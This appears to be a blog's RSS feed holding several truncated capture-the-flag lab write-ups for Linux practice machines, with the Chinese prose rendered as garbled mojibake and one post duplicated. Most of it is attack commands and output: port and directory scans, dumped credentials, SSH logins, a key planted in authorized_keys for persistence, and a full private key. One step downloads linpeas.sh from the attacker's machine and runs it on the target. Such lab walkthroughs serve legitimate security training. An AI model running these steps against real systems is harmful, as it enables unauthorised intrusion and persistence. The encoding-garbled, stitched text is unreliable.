|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-generator: PivotX
|_http-server-header: Apache/2.4.62 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry
|_/pivotx/
|_http-title:         PivotX Powered
MAC Address: 08:00:27:77:12:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€80`ç«¯å£,å…ˆå¸¸è§„æ‰«ä¸€ä¸‹ç›®å½•

```shell
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html
[19:17:35] Starting:
[19:17:46] 301 -  315B  - /images  -&gt;  http://192.168.31.72/images/
[19:17:46] 200 -  175B  - /images/
[19:17:47] 200 -    5KB - /LICENSE.txt
[19:17:52] 200 -  311B  - /README.md
[19:17:52] 200 -   33B  - /robots.txt
[19:17:55] 200 -  487B  - /UPGRADE.txt
[19:17:56] 200 -   12KB - /users.db
```

è®¿é—®`80`ç«¯å£æ²¡å•¥æœ‰ç”¨ä¿¡æ¯ï¼Œè®¿é—® `robots.txt` æç¤º`pivotx`ç›®å½•ï¼Œè®¿é—®ç›®å½•ä¸‹æœ‰ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæµ‹è¯•rootã€adminç­‰å¼±å¯†ç ä¸è¡Œ,åšåˆ°åé¢å‘ç°`var/www/html/creds.txt`ç»™äº†è´¦å·ä¿¡æ¯

```shell
http://192.168.31.72/pivotx/index.php

hungry@Base:/tmp$ cat  /var/www/html/creds.txt
guest:guest
admin:YWRtaW*=
```

æ‰«æåˆ°`users.db`æ•°æ®åº“ï¼Œè¯»å–åå­˜åœ¨ç”¨æˆ·`hungry/aHVuZ3J5`

```shell
â””â”€# file users.db
users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
â””â”€# sqlite3 users.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter '.help' for usage hints.
sqlite&gt; .tables
users
sqlite&gt; SELECT * FROM users;
id  username  password
--  --------  --------
1   hungry    aHVuZ3J5
```

å°è¯•è´¦å·`hungry/aHVuZ3J5`ç½‘é¡µç™»é™†ä¸å¯¹ï¼Œå»è¯•è¯•`ssh`ç™»é™†

![image-20250723193402371](https://gitee.com/shui666/images/raw/master/images/image-20250723193402371.png)

### 3.è·å¾—`hungry`æƒé™

ç›´æ¥æ‹¿`users.db`æ•°æ®åº“ä¸­ç”¨æˆ·`hungry/aHVuZ3J5`å»`ssh`ç™»é™†é¶æœºæˆåŠŸ

```
â””â”€# ssh hungry@$IP
hungry@Base:~$ id
uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
```

å†™ä¸ªå…¬é’¥æ–¹ä¾¿ç™»é™†

```
#é…ç½®å…å¯†ç™»é™†
mkdir .ssh
cd .ssh
echo '&lt;å…¬é’¥&gt;'&gt;&gt;authorized_keys
```



##### æ‹¿åˆ°`user.txt`

```shell
hungry@Base:~$ cd
hungry@Base:~$ ls
user.txt
hungry@Base:~$ cat user.txt
flag{user-051a0db9a92e4dacc70212da32fd0638}
```



### 4.è·å¾—`www-data`æƒé™

æ²¡æœ‰`sudo`å¯ä»¥æ‰§è¡Œï¼Œä¼ ä¸ªè„šæœ¬æ‰«ä¸€ä¸‹

```shell
kaliâ””â”€# python3 -m http.server 80

hungry@Base:/tmp$ wget  192.168.31.126/linpeas.sh
hungry@Base:/tmp$ chmod +x linpeas.sh
hungry@Base:/tmp$ bash linpeas.sh
```

å‘ç°`ssh`çš„é…ç½®æ–‡ä»¶ä¸­å…è®¸`root`ç™»é™†,å°è¯•ç›´æ¥ç”¨`top`å­—å…¸`ssh`çˆ†ç ´`root`å¯†ç å¤±è´¥

```
hungry@Base:~$ cat /etc/ssh/sshd_config| grep -i  root
PermitRootLogin yes
# the setting of 'PermitRootLogin without-password'.
#ChrootDirectory none
```

ç„¶åæ³¨æ„åˆ°å·²çŸ¥è´¦æˆ·çš„å¯†ç éƒ½æ˜¯`base64`

```
hungry-&gt;aHVuZ3J5
guest:guest
admin:YWRtaW*=
```

ç¾¤ä¸»æç¤ºäº†`www-data`æœ‰ç”¨ï¼Œå›åˆ°ç™»é™†é¡µé¢`/pivotx/index.php`ï¼Œä½¿ç”¨`admin/YWRtaW4=`æˆåŠŸç™»é™†åå°

![image-20250723210753096](https://gitee.com/shui666/images/raw/master/images/image-20250723210753096.png)

æœç´¢å‘ç°`PivotX`æ˜¯`PivotX`å¼€æºçš„ä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9ABase%2020250723.html</guid><pubDate>Sat, 09 Aug 2025 08:47:52 +0000</pubDate></item><item><title>HackMyVM:pdf 202506025</title><link>https://pingsag3.github.io/post/HackMyVM-pdf%20202506025.html</link><description>

### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=pdf
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œç›®å½•æ‰«æï¼Œmd5è®¡ç®—ï¼Œpdfå±æ€§æå–ï¼Œ`exiftool`å·¥å…·ï¼Œ`ssh`ææƒ,`hash`çˆ†ç ´
```

### 2. ä¿¡æ¯æ”¶é›†

##### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.43.97   08:00:27:5f:cd:b8       PCS Systemtechnik GmbH
â””â”€# IP=192.168.43.97 
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 07:17 EDT
Nmap scan report for 192.168.43.97 (192.168.43.97)
Host is up (0.0010s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
8080/tcp open  http-proxy
|_http-title: File Management System
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Wed, 25 Jun 2025 11:17:40 GMT
|     Content-Length: 1415
|     Content-Type: text/html; charset=utf-8
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang='en'&gt;
|     &lt;head&gt;
|     &lt;meta charset='UTF-8'&gt;
|     &lt;title&gt;File Management System&lt;/title&gt;
|     &lt;style&gt;
|     body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }
|     .container { max-width: 800px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
|     text-align: center; color: #333; }
|     .error { color: red; text-align: center; }
|     .hint { color: #555; text-align: center; font-style: italic; }
|     input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
|     button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
|_    button
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

å¼€æ”¾äº†`22ã€80ã€8080`ç«¯å£,æœ‰ä¸¤ä¸ª`web`ç«¯å£åˆ†åˆ«è®¿é—®ä¸€ä¸‹ï¼Œ`8080`ç«¯å£éœ€è¦`token`ç™»é™†,å†æ‰«ä¸€ä¸‹ç›®å½•

```shell
â””â”€# dirsearch -u http://$IP:8080  -x 403 -e txt,php,html
Target: http://192.168.43.97:8080/
[07:33:02] Starting: 
[07:33:02] 301 -   57B  - /%2e%2e//google.com  -&gt;  /%252E%252E/google.com
[07:33:30] 301 -   54B  - /axis//happyaxis.jsp  -&gt;  /axis/happyaxis.jsp
[07:33:30] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  -&gt;  /axis2/axis2-web/HappyAxis.jsp
[07:33:30] 301 -   59B  - /axis2-web//HappyAxis.jsp  -&gt;  /axis2-web/HappyAxis.jsp
[07:33:36] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  -&gt;  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[07:33:48] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  -&gt;  /engine/classes/swfupload/swfupload_f9.swf
[07:33:48] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  -&gt;  /engine/classes/swfupload/swfupload.swf
[07:33:49] 301 -   62B  - /extjs/resources//charts.swf  -&gt;  /extjs/resources/charts.swf
[07:33:55] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  -&gt;  /html/js/misc/swfupload/swfupload.swf
[07:34:04] 303 -   28B  - /logout  -&gt;  /
â””â”€# gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x.txt,.php,.html,.bak
===============================================================
/index.html           (Status: 200) [Size: 6]
/hint.txt             (Status: 200) [Size: 44]
```

ä½¿ç”¨`Gobuster`æ‰«æ`80`ç«¯å£æ—¶,å‘ç°æç¤ºä¿¡æ¯`hint.txt`

```shell
â””â”€# curl -s http://$IP/hint.txt                     
What's the ultimate answer to the universe?

```

ç½‘é¡µæœç´¢å¯çŸ¥å®‡å®™çš„ç»ˆæç­”æ¡ˆæ˜¯`42`ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/HackMyVM-pdf%20202506025.html</guid><pubDate>Sat, 09 Aug 2025 08:46:14 +0000</pubDate></item><item><title>ç¾¤å‹é¶æœºï¼šlanguage 202506024</title><link>https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9Alanguage%20202506024.html</link><description>

### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œ`MySQL`æ•°æ®åº“ï¼Œ`hydra`çˆ†ç ´ ï¼Œ`docker`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.43.19   08:00:27:5f:cd:b8       PCS Systemtechnik GmbH
â””â”€# IP=192.168.43.19 
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-24 07:03 EDT
Nmap scan report for 192.168.43.19 (192.168.43.19)
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
9999/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-git: 
|   192.168.43.19:9999/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/zhuifengshaonianhanlu/pikachu.git
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Get the pikachu
MAC Address: 08:00:27:5F:CD:B8 (Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€80ã€9999`ç«¯å£,`9999`ç«¯å£æç¤º`git`æ³„éœ²å…ˆå–ä¸‹æ¥æ²¡å‘ç°å•¥æœ‰ç”¨ä¿¡æ¯

```shell
GitHack&gt;python3 GitHack.py http://192.168.43.19:9999/.git

http://192.168.43.19:9999/index.php
Pikachu æ¼æ´ç»ƒä¹ å¹³å° pika~pika~
```

### 3.è·å¾—`www-data`æƒé™

å†å»çœ‹çœ‹``web:9999`æ˜¯`Pikachu`æ¼æ´ç»ƒä¹ å¹³å°ï¼Œ`Pikachu`æ˜¯ä¸€ä¸ªå¸¦æœ‰æ¼æ´çš„`Web`åº”ç”¨ç³»ç»Ÿï¼ŒåŒ…å«äº†å¸¸è§çš„`web`å®‰å…¨æ¼æ´ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9Alanguage%20202506024.html</guid><pubDate>Sat, 28 Jun 2025 23:37:04 +0000</pubDate></item><item><title>ç¾¤å‹é¶æœºï¼špdf 202506025</title><link>https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9Apdf%20202506025.html</link><description>

### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œç›®å½•æ‰«æï¼Œmd5è®¡ç®—ï¼Œpdfå±æ€§æå–ï¼Œ`exiftool`å·¥å…·ï¼Œ`ssh`ææƒ,`hash`çˆ†ç ´
```

### 2. ä¿¡æ¯æ”¶é›†

##### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.43.97   08:00:27:5f:cd:b8       PCS Systemtechnik GmbH
â””â”€# IP=192.168.43.97 
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-25 07:17 EDT
Nmap scan report for 192.168.43.97 (192.168.43.97)
Host is up (0.0010s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
8080/tcp open  http-proxy
|_http-title: File Management System
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Wed, 25 Jun 2025 11:17:40 GMT
|     Content-Length: 1415
|     Content-Type: text/html; charset=utf-8
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang='en'&gt;
|     &lt;head&gt;
|     &lt;meta charset='UTF-8'&gt;
|     &lt;title&gt;File Management System&lt;/title&gt;
|     &lt;style&gt;
|     body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }
|     .container { max-width: 800px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
|     text-align: center; color: #333; }
|     .error { color: red; text-align: center; }
|     .hint { color: #555; text-align: center; font-style: italic; }
|     input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
|     button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
|_    button
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

å¼€æ”¾äº†`22ã€80ã€8080`ç«¯å£,æœ‰ä¸¤ä¸ª`web`ç«¯å£åˆ†åˆ«è®¿é—®ä¸€ä¸‹ï¼Œ`8080`ç«¯å£éœ€è¦`token`ç™»é™†,å†æ‰«ä¸€ä¸‹ç›®å½•

```shell
â””â”€# dirsearch -u http://$IP:8080  -x 403 -e txt,php,html
Target: http://192.168.43.97:8080/
[07:33:02] Starting: 
[07:33:02] 301 -   57B  - /%2e%2e//google.com  -&gt;  /%252E%252E/google.com
[07:33:30] 301 -   54B  - /axis//happyaxis.jsp  -&gt;  /axis/happyaxis.jsp
[07:33:30] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  -&gt;  /axis2/axis2-web/HappyAxis.jsp
[07:33:30] 301 -   59B  - /axis2-web//HappyAxis.jsp  -&gt;  /axis2-web/HappyAxis.jsp
[07:33:36] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  -&gt;  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[07:33:48] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  -&gt;  /engine/classes/swfupload/swfupload_f9.swf
[07:33:48] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  -&gt;  /engine/classes/swfupload/swfupload.swf
[07:33:49] 301 -   62B  - /extjs/resources//charts.swf  -&gt;  /extjs/resources/charts.swf
[07:33:55] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  -&gt;  /html/js/misc/swfupload/swfupload.swf
[07:34:04] 303 -   28B  - /logout  -&gt;  /
â””â”€# gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x.txt,.php,.html,.bak
===============================================================
/index.html           (Status: 200) [Size: 6]
/hint.txt             (Status: 200) [Size: 44]
```

ä½¿ç”¨`Gobuster`æ‰«æ`80`ç«¯å£æ—¶,å‘ç°æç¤ºä¿¡æ¯`hint.txt`

```shell
â””â”€# curl -s http://$IP/hint.txt                     
What's the ultimate answer to the universe?

```

ç½‘é¡µæœç´¢å¯çŸ¥å®‡å®™çš„ç»ˆæç­”æ¡ˆæ˜¯`42`ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9Apdf%20202506025.html</guid><pubDate>Sat, 28 Jun 2025 23:35:42 +0000</pubDate></item><item><title>ç¾¤ä¸»é¶æœº Space 20250623</title><link>https://pingsag3.github.io/post/qun-zhu-ba-ji-%20Space%2020250623.html</link><description>

### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=
```

```shell
éš¾åº¦ï¼šâ­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œ`ç§é’¥`åˆ©ç”¨ï¼Œ`suForce`å¯†ç çˆ†ç ´ï¼Œ`dos2unix`ææƒï¼Œå†™`å…¬é’¥`
```

### 2. ä¿¡æ¯æ”¶é›†

##### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.229  08:00:27:c5:06:9a       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.229
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:18 CST
Nmap scan report for Space (192.168.31.229)
Host is up (0.0014s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Typing Challenge
MAC Address: 08:00:27:C5:06:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€80`ç«¯å£,å…ˆçœ‹çœ‹`80`æœ‰å•¥ä¸œè¥¿

### 3.ç›®å½•æ‰«æ

```shell
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html
[21:18:51] Starting:
[21:18:59] 302 -    0B  - /check.php  -&gt;  index.php
[21:19:03] 200 -    3KB - /index.php
[21:19:03] 200 -    3KB - /index.php/login/

#Challenge Complete!
Congratulations! You have successfully completed the challenge.
Your reward: /var/www/html/andeli.id_rsa
```

ä¹ æƒ¯æ€§æ‰«ç›®å½•æ²¡å•¥æ˜æ˜¾æœ‰ç”¨ä¿¡æ¯ï¼Œç›´æ¥è®¿é—®ä¸»é¡µæ˜¯æ‰“å­—æŒ‘æˆ˜é¡µé¢ï¼Œæ ¹æ®æç¤ºå¤åˆ¶5å¥è¯åè·å¾—æç¤ºä¿¡æ¯ï¼šç½‘ç«™æ ¹ç›®å½•`/var/www/html/andeli.id_rsa`ä¸‹æœ‰ç§é’¥

æŠŠç§é’¥å–ä¸‹æ¥

```
â””â”€# curl http://$IP/andeli.id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### 4.è·å¾—`andeli`æƒé™

##### `ç§é’¥`åˆ©ç”¨

```
#é€šè¿‡ç§é’¥è§£å‡ºå…¬é’¥
â””â”€#ssh-keygen -y -f &lt;ç§é’¥&gt;
#ç§é’¥ç™»é™†
#ssh &lt;ç§é’¥è´¦æˆ·å&gt;@ip -i &lt;ç§é’¥&gt;
```

é€šè¿‡ç§é’¥è§£å‡ºå…¬é’¥ï¼Œå†é€šè¿‡ç§é’¥ç™»é™†è´¦æˆ·`andeli`

```shell
â””â”€# echo '&lt;ç§é’¥&gt;' &gt; id
â””â”€# chmod 600 id
â””â”€# ssh-keygen -y -f id
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnfC0nbu5Bq1wz718/yBkJPuKhVtKYUzkxZln7hln8AmzB+4j2d3MAO8mCtWAKPb/+8c7seVrRXhLucdxysUtW4fHPG1xNeIhMqaj5LQ3S4G7Q12TMXC+ZM+pHi0b+nUbp+C31+az22rD8DYRh/kyT9wO/07CEaV1QCtBkP0N39nLtmdEaEFUeb8dPFvAJp3Sfg6v348RTMlvlTD4YbwDc/QnXbwFSUjGPgzb8jvr2rfFIbgS5P2SoAlcJ3EC8jNno4h8Qj3IWhE9sMsR773nLnOhCkfphqvkuqIr5f5ifFJxZbAJ7evgFAkKIdPsuMgrQcflhQyQVyvu31C83K3O0k+valVARP1R2SI3bu7YMLKBXDnLWrSs/d8KwRkMJQnFx+Of09nDkhHOolw7UE8gVpw+m+/+NYjUMDWyZ3T7Gv8BRYQEvjz3YZnqExHi40uW9raI+hOzhx9m2F5xdZ3QiYLJZxJ7pLmkU1Zn4L+7tN3uXjrGGU3pPD83afW9Cu6k= andeli@Space
â””â”€# ssh andeli@$IP -i id
The authenticity of host '192.168.31.229 (192.168.31.229)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:36: [hashed name]
    (7 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.31.229' (ED25519) to the list of known hosts.
Linux Space 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
andeli@Space:~$ id
uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
```

ç›´æ¥`ç§é’¥`å»ç™»é™†è·å¾—`user.txt`

##### æ‹¿åˆ°`user.txt`

```shell
andeli@Space:~$ id
uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
